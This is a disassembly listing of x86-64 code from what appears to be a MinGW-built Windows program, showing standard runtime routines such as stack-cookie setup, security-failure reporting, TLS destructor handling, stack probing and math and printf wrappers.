  404d90:	56                   	push   %rsi
  404d91:	53                   	push   %rbx
  404d92:	48 83 ec 28          	sub    $0x28,%rsp
  404d96:	48 8b 05 03 56 00 00 	mov    0x5603(%rip),%rax        # 0x40a3a0
  404d9d:	83 f8 ff             	cmp    $0xffffffff,%eax
  404da0:	89 c3                	mov    %eax,%ebx
  404da2:	74 2c                	je     0x404dd0
  404da4:	85 db                	test   %ebx,%ebx
  404da6:	48 8d 35 f3 55 00 00 	lea    0x55f3(%rip),%rsi        # 0x40a3a0
  404dad:	74 0b                	je     0x404dba
  404daf:	90                   	nop
  404db0:	89 d8                	mov    %ebx,%eax
  404db2:	ff 14 c6             	call   *(%rsi,%rax,8)
  404db5:	83 eb 01             	sub    $0x1,%ebx
  404db8:	75 f6                	jne    0x404db0
  404dba:	48 8d 0d 8f ff ff ff 	lea    -0x71(%rip),%rcx        # 0x404d50
  404dc1:	48 83 c4 28          	add    $0x28,%rsp
  404dc5:	5b                   	pop    %rbx
  404dc6:	5e                   	pop    %rsi
  404dc7:	e9 34 f0 ff ff       	jmp    0x403e00
  404dcc:	0f 1f 40 00          	nopl   0x0(%rax)
  404dd0:	31 db                	xor    %ebx,%ebx
  404dd2:	48 8d 35 c7 55 00 00 	lea    0x55c7(%rip),%rsi        # 0x40a3a0
  404dd9:	eb 07                	jmp    0x404de2
  404ddb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404de0:	89 c3                	mov    %eax,%ebx
  404de2:	8d 43 01             	lea    0x1(%rbx),%eax
  404de5:	89 c2                	mov    %eax,%edx
  404de7:	48 83 3c d6 00       	cmpq   $0x0,(%rsi,%rdx,8)
  404dec:	75 f2                	jne    0x404de0
  404dee:	eb b4                	jmp    0x404da4
  404df0:	8b 05 aa 75 0d 00    	mov    0xd75aa(%rip),%eax        # 0x4dc3a0
  404df6:	85 c0                	test   %eax,%eax
  404df8:	74 06                	je     0x404e00
  404dfa:	f3 c3                	repz ret
  404dfc:	0f 1f 40 00          	nopl   0x0(%rax)
  404e00:	c7 05 96 75 0d 00 01 	movl   $0x1,0xd7596(%rip)        # 0x4dc3a0
  404e07:	00 00 00 
  404e0a:	eb 84                	jmp    0x404d90
  404e0c:	90                   	nop
  404e0d:	90                   	nop
  404e0e:	90                   	nop
  404e0f:	90                   	nop
  404e10:	41 54                	push   %r12
  404e12:	55                   	push   %rbp
  404e13:	57                   	push   %rdi
  404e14:	56                   	push   %rsi
  404e15:	53                   	push   %rbx
  404e16:	48 83 ec 40          	sub    $0x40,%rsp
  404e1a:	48 8b 1d 3f 41 0d 00 	mov    0xd413f(%rip),%rbx        # 0x4d8f60
  404e21:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  404e28:	2b 00 00 
  404e2b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  404e32:	00 00 
  404e34:	48 39 c3             	cmp    %rax,%rbx
  404e37:	74 17                	je     0x404e50
  404e39:	48 f7 d3             	not    %rbx
  404e3c:	48 89 1d 2d 41 0d 00 	mov    %rbx,0xd412d(%rip)        # 0x4d8f70
  404e43:	48 83 c4 40          	add    $0x40,%rsp
  404e47:	5b                   	pop    %rbx
  404e48:	5e                   	pop    %rsi
  404e49:	5f                   	pop    %rdi
  404e4a:	5d                   	pop    %rbp
  404e4b:	41 5c                	pop    %r12
  404e4d:	c3                   	ret
  404e4e:	66 90                	xchg   %ax,%ax
  404e50:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  404e55:	ff 15 85 97 0d 00    	call   *0xd9785(%rip)        # 0x4de5e0
  404e5b:	4c 8b 64 24 20       	mov    0x20(%rsp),%r12
  404e60:	ff 15 22 97 0d 00    	call   *0xd9722(%rip)        # 0x4de588
  404e66:	89 c5                	mov    %eax,%ebp
  404e68:	ff 15 22 97 0d 00    	call   *0xd9722(%rip)        # 0x4de590
  404e6e:	89 c7                	mov    %eax,%edi
  404e70:	ff 15 72 97 0d 00    	call   *0xd9772(%rip)        # 0x4de5e8
  404e76:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  404e7b:	89 c6                	mov    %eax,%esi
  404e7d:	ff 15 ad 97 0d 00    	call   *0xd97ad(%rip)        # 0x4de630
  404e83:	4c 89 e2             	mov    %r12,%rdx
  404e86:	48 33 54 24 30       	xor    0x30(%rsp),%rdx
  404e8b:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffff,%rax
  404e92:	ff 00 00 
  404e95:	48 31 ea             	xor    %rbp,%rdx
  404e98:	48 31 fa             	xor    %rdi,%rdx
  404e9b:	48 31 f2             	xor    %rsi,%rdx
  404e9e:	48 21 c2             	and    %rax,%rdx
  404ea1:	48 39 da             	cmp    %rbx,%rdx
  404ea4:	74 1f                	je     0x404ec5
  404ea6:	48 89 d0             	mov    %rdx,%rax
  404ea9:	48 f7 d0             	not    %rax
  404eac:	48 89 15 ad 40 0d 00 	mov    %rdx,0xd40ad(%rip)        # 0x4d8f60
  404eb3:	48 89 05 b6 40 0d 00 	mov    %rax,0xd40b6(%rip)        # 0x4d8f70
  404eba:	48 83 c4 40          	add    $0x40,%rsp
  404ebe:	5b                   	pop    %rbx
  404ebf:	5e                   	pop    %rsi
  404ec0:	5f                   	pop    %rdi
  404ec1:	5d                   	pop    %rbp
  404ec2:	41 5c                	pop    %r12
  404ec4:	c3                   	ret
  404ec5:	48 b8 cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rax
  404ecc:	d4 ff ff 
  404ecf:	48 ba 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rdx
  404ed6:	2b 00 00 
  404ed9:	eb d1                	jmp    0x404eac
  404edb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404ee0:	55                   	push   %rbp
  404ee1:	48 89 e5             	mov    %rsp,%rbp
  404ee4:	56                   	push   %rsi
  404ee5:	53                   	push   %rbx
  404ee6:	48 83 ec 70          	sub    $0x70,%rsp
  404eea:	48 89 ce             	mov    %rcx,%rsi
  404eed:	48 8d 0d cc 74 0d 00 	lea    0xd74cc(%rip),%rcx        # 0x4dc3c0
  404ef4:	ff 15 56 97 0d 00    	call   *0xd9756(%rip)        # 0x4de650
  404efa:	48 8b 1d b7 75 0d 00 	mov    0xd75b7(%rip),%rbx        # 0x4dc4b8
  404f01:	45 31 c0             	xor    %r8d,%r8d
  404f04:	48 8d 55 c8          	lea    -0x38(%rbp),%rdx
  404f08:	48 89 d9             	mov    %rbx,%rcx
  404f0b:	ff 15 47 97 0d 00    	call   *0xd9747(%rip)        # 0x4de658
  404f11:	48 85 c0             	test   %rax,%rax
  404f14:	49 89 c1             	mov    %rax,%r9
  404f17:	0f 84 a3 00 00 00    	je     0x404fc0
  404f1d:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  404f21:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  404f28:	00 00 
  404f2a:	49 89 d8             	mov    %rbx,%r8
  404f2d:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  404f31:	31 c9                	xor    %ecx,%ecx
  404f33:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f38:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
  404f3c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404f41:	48 8d 05 78 74 0d 00 	lea    0xd7478(%rip),%rax        # 0x4dc3c0
  404f48:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404f4d:	ff 15 0d 97 0d 00    	call   *0xd970d(%rip)        # 0x4de660
  404f53:	48 8b 05 5e 75 0d 00 	mov    0xd755e(%rip),%rax        # 0x4dc4b8
  404f5a:	31 c9                	xor    %ecx,%ecx
  404f5c:	48 89 35 dd 74 0d 00 	mov    %rsi,0xd74dd(%rip)        # 0x4dc440
  404f63:	c7 05 33 79 0d 00 09 	movl   $0xc0000409,0xd7933(%rip)        # 0x4dc8a0
  404f6a:	04 00 c0 
  404f6d:	c7 05 2d 79 0d 00 01 	movl   $0x1,0xd792d(%rip)        # 0x4dc8a4
  404f74:	00 00 00 
  404f77:	48 89 05 32 79 0d 00 	mov    %rax,0xd7932(%rip)        # 0x4dc8b0
  404f7e:	48 8b 05 db 3f 0d 00 	mov    0xd3fdb(%rip),%rax        # 0x4d8f60
  404f85:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  404f89:	48 8b 05 e0 3f 0d 00 	mov    0xd3fe0(%rip),%rax        # 0x4d8f70
  404f90:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  404f94:	ff 15 ce 96 0d 00    	call   *0xd96ce(%rip)        # 0x4de668
  404f9a:	48 8d 0d 3f 3f 0d 00 	lea    0xd3f3f(%rip),%rcx        # 0x4d8ee0
  404fa1:	ff 15 e1 96 0d 00    	call   *0xd96e1(%rip)        # 0x4de688
  404fa7:	ff 15 d3 95 0d 00    	call   *0xd95d3(%rip)        # 0x4de580
  404fad:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  404fb2:	48 89 c1             	mov    %rax,%rcx
  404fb5:	ff 15 bd 96 0d 00    	call   *0xd96bd(%rip)        # 0x4de678
  404fbb:	e8 98 50 00 00       	call   0x40a058
  404fc0:	48 8b 45 08          	mov    0x8(%rbp),%rax
  404fc4:	48 89 05 ed 74 0d 00 	mov    %rax,0xd74ed(%rip)        # 0x4dc4b8
  404fcb:	48 8d 45 08          	lea    0x8(%rbp),%rax
  404fcf:	48 89 05 82 74 0d 00 	mov    %rax,0xd7482(%rip)        # 0x4dc458
  404fd6:	e9 78 ff ff ff       	jmp    0x404f53
  404fdb:	90                   	nop
  404fdc:	90                   	nop
  404fdd:	90                   	nop
  404fde:	90                   	nop
  404fdf:	90                   	nop
  404fe0:	55                   	push   %rbp
  404fe1:	57                   	push   %rdi
  404fe2:	56                   	push   %rsi
  404fe3:	53                   	push   %rbx
  404fe4:	48 83 ec 28          	sub    $0x28,%rsp
  404fe8:	48 8d 0d 71 79 0d 00 	lea    0xd7971(%rip),%rcx        # 0x4dc960
  404fef:	ff 15 83 95 0d 00    	call   *0xd9583(%rip)        # 0x4de578
  404ff5:	48 8b 1d 8c 79 0d 00 	mov    0xd798c(%rip),%rbx        # 0x4dc988
  404ffc:	48 85 db             	test   %rbx,%rbx
  404fff:	74 33                	je     0x405034
  405001:	48 8b 2d 78 96 0d 00 	mov    0xd9678(%rip),%rbp        # 0x4de680
  405008:	48 8b 3d 91 95 0d 00 	mov    0xd9591(%rip),%rdi        # 0x4de5a0
  40500f:	90                   	nop
  405010:	8b 0b                	mov    (%rbx),%ecx
  405012:	ff d5                	call   *%rbp
  405014:	48 89 c6             	mov    %rax,%rsi
  405017:	ff d7                	call   *%rdi
  405019:	85 c0                	test   %eax,%eax
  40501b:	75 0e                	jne    0x40502b
  40501d:	48 85 f6             	test   %rsi,%rsi
  405020:	74 09                	je     0x40502b
  405022:	48 8b 43 08          	mov    0x8(%rbx),%rax
  405026:	48 89 f1             	mov    %rsi,%rcx
  405029:	ff d0                	call   *%rax
  40502b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  40502f:	48 85 db             	test   %rbx,%rbx
  405032:	75 dc                	jne    0x405010
  405034:	48 8b 05 cd 95 0d 00 	mov    0xd95cd(%rip),%rax        # 0x4de608
  40503b:	48 8d 0d 1e 79 0d 00 	lea    0xd791e(%rip),%rcx        # 0x4dc960
  405042:	48 83 c4 28          	add    $0x28,%rsp
  405046:	5b                   	pop    %rbx
  405047:	5e                   	pop    %rsi
  405048:	5f                   	pop    %rdi
  405049:	5d                   	pop    %rbp
  40504a:	48 ff e0             	rex.W jmp *%rax
  40504d:	0f 1f 00             	nopl   (%rax)
  405050:	55                   	push   %rbp
  405051:	57                   	push   %rdi
  405052:	56                   	push   %rsi
  405053:	53                   	push   %rbx
  405054:	48 83 ec 28          	sub    $0x28,%rsp
  405058:	8b 05 e2 78 0d 00    	mov    0xd78e2(%rip),%eax        # 0x4dc940
  40505e:	31 f6                	xor    %esi,%esi
  405060:	89 cd                	mov    %ecx,%ebp
  405062:	48 89 d7             	mov    %rdx,%rdi
  405065:	85 c0                	test   %eax,%eax
  405067:	75 0b                	jne    0x405074
  405069:	89 f0                	mov    %esi,%eax
  40506b:	48 83 c4 28          	add    $0x28,%rsp
  40506f:	5b                   	pop    %rbx
  405070:	5e                   	pop    %rsi
  405071:	5f                   	pop    %rdi
  405072:	5d                   	pop    %rbp
  405073:	c3                   	ret
  405074:	ba 18 00 00 00       	mov    $0x18,%edx
  405079:	b9 01 00 00 00       	mov    $0x1,%ecx
  40507e:	e8 e5 4f 00 00       	call   0x40a068
  405083:	48 85 c0             	test   %rax,%rax
  405086:	48 89 c3             	mov    %rax,%rbx
  405089:	74 3d                	je     0x4050c8
  40508b:	89 28                	mov    %ebp,(%rax)
  40508d:	48 89 78 08          	mov    %rdi,0x8(%rax)
  405091:	48 8d 0d c8 78 0d 00 	lea    0xd78c8(%rip),%rcx        # 0x4dc960
  405098:	ff 15 da 94 0d 00    	call   *0xd94da(%rip)        # 0x4de578
  40509e:	48 8b 05 e3 78 0d 00 	mov    0xd78e3(%rip),%rax        # 0x4dc988
  4050a5:	48 8d 0d b4 78 0d 00 	lea    0xd78b4(%rip),%rcx        # 0x4dc960
  4050ac:	48 89 1d d5 78 0d 00 	mov    %rbx,0xd78d5(%rip)        # 0x4dc988
  4050b3:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4050b7:	ff 15 4b 95 0d 00    	call   *0xd954b(%rip)        # 0x4de608
  4050bd:	89 f0                	mov    %esi,%eax
  4050bf:	48 83 c4 28          	add    $0x28,%rsp
  4050c3:	5b                   	pop    %rbx
  4050c4:	5e                   	pop    %rsi
  4050c5:	5f                   	pop    %rdi
  4050c6:	5d                   	pop    %rbp
  4050c7:	c3                   	ret
  4050c8:	be ff ff ff ff       	mov    $0xffffffff,%esi
  4050cd:	eb 9a                	jmp    0x405069
  4050cf:	90                   	nop
  4050d0:	53                   	push   %rbx
  4050d1:	48 83 ec 20          	sub    $0x20,%rsp
  4050d5:	8b 05 65 78 0d 00    	mov    0xd7865(%rip),%eax        # 0x4dc940
  4050db:	89 cb                	mov    %ecx,%ebx
  4050dd:	85 c0                	test   %eax,%eax
  4050df:	75 0f                	jne    0x4050f0
  4050e1:	31 c0                	xor    %eax,%eax
  4050e3:	48 83 c4 20          	add    $0x20,%rsp
  4050e7:	5b                   	pop    %rbx
  4050e8:	c3                   	ret
  4050e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4050f0:	48 8d 0d 69 78 0d 00 	lea    0xd7869(%rip),%rcx        # 0x4dc960
  4050f7:	ff 15 7b 94 0d 00    	call   *0xd947b(%rip)        # 0x4de578
  4050fd:	48 8b 15 84 78 0d 00 	mov    0xd7884(%rip),%rdx        # 0x4dc988
  405104:	48 85 d2             	test   %rdx,%rdx
  405107:	74 1c                	je     0x405125
  405109:	8b 02                	mov    (%rdx),%eax
  40510b:	39 d8                	cmp    %ebx,%eax
  40510d:	75 0d                	jne    0x40511c
  40510f:	eb 4e                	jmp    0x40515f
  405111:	44 8b 00             	mov    (%rax),%r8d
  405114:	41 39 d8             	cmp    %ebx,%r8d
  405117:	74 27                	je     0x405140
  405119:	48 89 c2             	mov    %rax,%rdx
  40511c:	48 8b 42 10          	mov    0x10(%rdx),%rax
  405120:	48 85 c0             	test   %rax,%rax
  405123:	75 ec                	jne    0x405111
  405125:	48 8d 0d 34 78 0d 00 	lea    0xd7834(%rip),%rcx        # 0x4dc960
  40512c:	ff 15 d6 94 0d 00    	call   *0xd94d6(%rip)        # 0x4de608
  405132:	31 c0                	xor    %eax,%eax
  405134:	48 83 c4 20          	add    $0x20,%rsp
  405138:	5b                   	pop    %rbx
  405139:	c3                   	ret
  40513a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  405140:	48 8b 48 10          	mov    0x10(%rax),%rcx
  405144:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  405148:	48 89 c1             	mov    %rax,%rcx
  40514b:	e8 90 4e 00 00       	call   0x409fe0
  405150:	48 8d 0d 09 78 0d 00 	lea    0xd7809(%rip),%rcx        # 0x4dc960
  405157:	ff 15 ab 94 0d 00    	call   *0xd94ab(%rip)        # 0x4de608
  40515d:	eb d3                	jmp    0x405132
  40515f:	48 8b 42 10          	mov    0x10(%rdx),%rax
  405163:	48 89 05 1e 78 0d 00 	mov    %rax,0xd781e(%rip)        # 0x4dc988
  40516a:	48 89 d0             	mov    %rdx,%rax
  40516d:	eb d9                	jmp    0x405148
  40516f:	90                   	nop
  405170:	48 83 ec 28          	sub    $0x28,%rsp
  405174:	83 fa 01             	cmp    $0x1,%edx
  405177:	74 47                	je     0x4051c0
  405179:	72 15                	jb     0x405190
  40517b:	83 fa 03             	cmp    $0x3,%edx
  40517e:	74 60                	je     0x4051e0
  405180:	b8 01 00 00 00       	mov    $0x1,%eax
  405185:	48 83 c4 28          	add    $0x28,%rsp
  405189:	c3                   	ret
  40518a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  405190:	8b 05 aa 77 0d 00    	mov    0xd77aa(%rip),%eax        # 0x4dc940
  405196:	85 c0                	test   %eax,%eax
  405198:	75 66                	jne    0x405200
  40519a:	8b 05 a0 77 0d 00    	mov    0xd77a0(%rip),%eax        # 0x4dc940
  4051a0:	83 f8 01             	cmp    $0x1,%eax
  4051a3:	75 db                	jne    0x405180
  4051a5:	48 8d 0d b4 77 0d 00 	lea    0xd77b4(%rip),%rcx        # 0x4dc960
  4051ac:	c7 05 8a 77 0d 00 00 	movl   $0x0,0xd778a(%rip)        # 0x4dc940
  4051b3:	00 00 00 
  4051b6:	ff 15 b4 93 0d 00    	call   *0xd93b4(%rip)        # 0x4de570
  4051bc:	eb c2                	jmp    0x405180
  4051be:	66 90                	xchg   %ax,%ax
  4051c0:	8b 05 7a 77 0d 00    	mov    0xd777a(%rip),%eax        # 0x4dc940
  4051c6:	85 c0                	test   %eax,%eax
  4051c8:	74 27                	je     0x4051f1
  4051ca:	b8 01 00 00 00       	mov    $0x1,%eax
  4051cf:	c7 05 67 77 0d 00 01 	movl   $0x1,0xd7767(%rip)        # 0x4dc940
  4051d6:	00 00 00 
  4051d9:	48 83 c4 28          	add    $0x28,%rsp
  4051dd:	c3                   	ret
  4051de:	66 90                	xchg   %ax,%ax
  4051e0:	8b 05 5a 77 0d 00    	mov    0xd775a(%rip),%eax        # 0x4dc940
  4051e6:	85 c0                	test   %eax,%eax
  4051e8:	74 96                	je     0x405180
  4051ea:	e8 f1 fd ff ff       	call   0x404fe0
  4051ef:	eb 8f                	jmp    0x405180
  4051f1:	48 8d 0d 68 77 0d 00 	lea    0xd7768(%rip),%rcx        # 0x4dc960
  4051f8:	ff 15 fa 93 0d 00    	call   *0xd93fa(%rip)        # 0x4de5f8
  4051fe:	eb ca                	jmp    0x4051ca
  405200:	e8 db fd ff ff       	call   0x404fe0
  405205:	eb 93                	jmp    0x40519a
  405207:	90                   	nop
  405208:	90                   	nop
  405209:	90                   	nop
  40520a:	90                   	nop
  40520b:	90                   	nop
  40520c:	90                   	nop
  40520d:	90                   	nop
  40520e:	90                   	nop
  40520f:	90                   	nop
  405210:	51                   	push   %rcx
  405211:	50                   	push   %rax
  405212:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  405218:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  40521d:	72 19                	jb     0x405238
  40521f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  405226:	48 83 09 00          	orq    $0x0,(%rcx)
  40522a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  405230:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  405236:	77 e7                	ja     0x40521f
  405238:	48 29 c1             	sub    %rax,%rcx
  40523b:	48 83 09 00          	orq    $0x0,(%rcx)
  40523f:	58                   	pop    %rax
  405240:	59                   	pop    %rcx
  405241:	c3                   	ret
  405242:	90                   	nop
  405243:	90                   	nop
  405244:	90                   	nop
  405245:	90                   	nop
  405246:	90                   	nop
  405247:	90                   	nop
  405248:	90                   	nop
  405249:	90                   	nop
  40524a:	90                   	nop
  40524b:	90                   	nop
  40524c:	90                   	nop
  40524d:	90                   	nop
  40524e:	90                   	nop
  40524f:	90                   	nop
  405250:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  405257:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
  40525d:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  405262:	dd 44 24 38          	fldl   0x38(%rsp)
  405266:	48 89 ca             	mov    %rcx,%rdx
  405269:	48 c1 ea 20          	shr    $0x20,%rdx
  40526d:	89 d0                	mov    %edx,%eax
  40526f:	81 e2 00 00 f0 7f    	and    $0x7ff00000,%edx
  405275:	25 ff ff 0f 00       	and    $0xfffff,%eax
  40527a:	09 c8                	or     %ecx,%eax
  40527c:	89 c1                	mov    %eax,%ecx
  40527e:	09 d1                	or     %edx,%ecx
  405280:	74 04                	je     0x405286
  405282:	85 d2                	test   %edx,%edx
  405284:	75 3a                	jne    0x4052c0
  405286:	db 7c 24 60          	fstpt  0x60(%rsp)
  40528a:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
  40528f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
  405294:	e8 47 02 00 00       	call   0x4054e0
  405299:	db 6c 24 70          	fldt   0x70(%rsp)
  40529d:	dd 5c 24 58          	fstpl  0x58(%rsp)
  4052a1:	dd 44 24 58          	fldl   0x58(%rsp)
  4052a5:	dd 5c 24 38          	fstpl  0x38(%rsp)
  4052a9:	f2 0f 10 44 24 38    	movsd  0x38(%rsp),%xmm0
  4052af:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
  4052b6:	c3                   	ret
  4052b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4052be:	00 00 
  4052c0:	81 fa 00 00 f0 7f    	cmp    $0x7ff00000,%edx
  4052c6:	75 be                	jne    0x405286
  4052c8:	85 c0                	test   %eax,%eax
  4052ca:	dd 5c 24 40          	fstpl  0x40(%rsp)
  4052ce:	74 40                	je     0x405310
  4052d0:	e8 9b 4d 00 00       	call   0x40a070
  4052d5:	dd 44 24 40          	fldl   0x40(%rsp)
  4052d9:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  4052df:	48 8d 15 9a 45 0d 00 	lea    0xd459a(%rip),%rdx        # 0x4d9880
  4052e6:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  4052ea:	b9 01 00 00 00       	mov    $0x1,%ecx
  4052ef:	dd 54 24 20          	fstl   0x20(%rsp)
  4052f3:	dd 5c 24 38          	fstpl  0x38(%rsp)
  4052f7:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  4052fd:	e8 9e ef ff ff       	call   0x4042a0
  405302:	dd 44 24 40          	fldl   0x40(%rsp)
  405306:	eb 9d                	jmp    0x4052a5
  405308:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40530f:	00 
  405310:	e8 5b 4d 00 00       	call   0x40a070
  405315:	dd 44 24 40          	fldl   0x40(%rsp)
  405319:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  40531f:	48 8d 15 5a 45 0d 00 	lea    0xd455a(%rip),%rdx        # 0x4d9880
  405326:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  40532a:	48 b8 00 00 00 00 00 	movabs $0x7ff8000000000000,%rax
  405331:	00 f8 7f 
  405334:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405338:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40533d:	b9 01 00 00 00       	mov    $0x1,%ecx
  405342:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  405348:	e8 53 ef ff ff       	call   0x4042a0
  40534d:	dd 05 35 45 0d 00    	fldl   0xd4535(%rip)        # 0x4d9888
  405353:	e9 4d ff ff ff       	jmp    0x4052a5
  405358:	90                   	nop
  405359:	90                   	nop
  40535a:	90                   	nop
  40535b:	90                   	nop
  40535c:	90                   	nop
  40535d:	90                   	nop
  40535e:	90                   	nop
  40535f:	90                   	nop
  405360:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  405367:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
  40536d:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  405372:	dd 44 24 38          	fldl   0x38(%rsp)
  405376:	48 89 ca             	mov    %rcx,%rdx
  405379:	48 c1 ea 20          	shr    $0x20,%rdx
  40537d:	89 d0                	mov    %edx,%eax
  40537f:	81 e2 00 00 f0 7f    	and    $0x7ff00000,%edx
  405385:	25 ff ff 0f 00       	and    $0xfffff,%eax
  40538a:	09 c8                	or     %ecx,%eax
  40538c:	89 c1                	mov    %eax,%ecx
  40538e:	09 d1                	or     %edx,%ecx
  405390:	74 04                	je     0x405396
  405392:	85 d2                	test   %edx,%edx
  405394:	75 3a                	jne    0x4053d0
  405396:	db 7c 24 60          	fstpt  0x60(%rsp)
  40539a:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
  40539f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
  4053a4:	e8 77 01 00 00       	call   0x405520
  4053a9:	db 6c 24 70          	fldt   0x70(%rsp)
  4053ad:	dd 5c 24 58          	fstpl  0x58(%rsp)
  4053b1:	dd 44 24 58          	fldl   0x58(%rsp)
  4053b5:	dd 5c 24 38          	fstpl  0x38(%rsp)
  4053b9:	f2 0f 10 44 24 38    	movsd  0x38(%rsp),%xmm0
  4053bf:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
  4053c6:	c3                   	ret
  4053c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4053ce:	00 00 
  4053d0:	81 fa 00 00 f0 7f    	cmp    $0x7ff00000,%edx
  4053d6:	75 be                	jne    0x405396
  4053d8:	85 c0                	test   %eax,%eax
  4053da:	dd 5c 24 40          	fstpl  0x40(%rsp)
  4053de:	74 40                	je     0x405420
  4053e0:	e8 8b 4c 00 00       	call   0x40a070
  4053e5:	dd 44 24 40          	fldl   0x40(%rsp)
  4053e9:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  4053ef:	48 8d 15 9a 44 0d 00 	lea    0xd449a(%rip),%rdx        # 0x4d9890
  4053f6:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  4053fa:	b9 01 00 00 00       	mov    $0x1,%ecx
  4053ff:	dd 54 24 20          	fstl   0x20(%rsp)
  405403:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405407:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  40540d:	e8 8e ee ff ff       	call   0x4042a0
  405412:	dd 44 24 40          	fldl   0x40(%rsp)
  405416:	eb 9d                	jmp    0x4053b5
  405418:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40541f:	00 
  405420:	e8 4b 4c 00 00       	call   0x40a070
  405425:	dd 44 24 40          	fldl   0x40(%rsp)
  405429:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  40542f:	48 8d 15 5a 44 0d 00 	lea    0xd445a(%rip),%rdx        # 0x4d9890
  405436:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  40543a:	48 b8 00 00 00 00 00 	movabs $0x7ff8000000000000,%rax
  405441:	00 f8 7f 
  405444:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405448:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40544d:	b9 01 00 00 00       	mov    $0x1,%ecx
  405452:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  405458:	e8 43 ee ff ff       	call   0x4042a0
  40545d:	dd 05 35 44 0d 00    	fldl   0xd4435(%rip)        # 0x4d9898
  405463:	e9 4d ff ff ff       	jmp    0x4053b5
  405468:	90                   	nop
  405469:	90                   	nop
  40546a:	90                   	nop
  40546b:	90                   	nop
  40546c:	90                   	nop
  40546d:	90                   	nop
  40546e:	90                   	nop
  40546f:	90                   	nop
  405470:	48 83 ec 48          	sub    $0x48,%rsp
  405474:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
  405479:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  40547e:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  405483:	45 31 c0             	xor    %r8d,%r8d
  405486:	49 89 d1             	mov    %rdx,%r9
  405489:	48 89 ca             	mov    %rcx,%rdx
  40548c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  405491:	b9 00 60 00 00       	mov    $0x6000,%ecx
  405496:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  40549b:	e8 a0 16 00 00       	call   0x406b40
  4054a0:	48 83 c4 48          	add    $0x48,%rsp
  4054a4:	c3                   	ret
  4054a5:	90                   	nop
  4054a6:	90                   	nop
  4054a7:	90                   	nop
  4054a8:	90                   	nop
  4054a9:	90                   	nop
  4054aa:	90                   	nop
  4054ab:	90                   	nop
  4054ac:	90                   	nop
  4054ad:	90                   	nop
  4054ae:	90                   	nop
  4054af:	90                   	nop
  4054b0:	48 83 ec 38          	sub    $0x38,%rsp
  4054b4:	49 89 d1             	mov    %rdx,%r9
  4054b7:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  4054bc:	48 89 ca             	mov    %rcx,%rdx
  4054bf:	45 31 c0             	xor    %r8d,%r8d
  4054c2:	b9 00 60 00 00       	mov    $0x6000,%ecx
  4054c7:	e8 74 16 00 00       	call   0x406b40
  4054cc:	48 83 c4 38          	add    $0x38,%rsp
  4054d0:	c3                   	ret
  4054d1:	90                   	nop
  4054d2:	90                   	nop
  4054d3:	90                   	nop
  4054d4:	90                   	nop
  4054d5:	90                   	nop
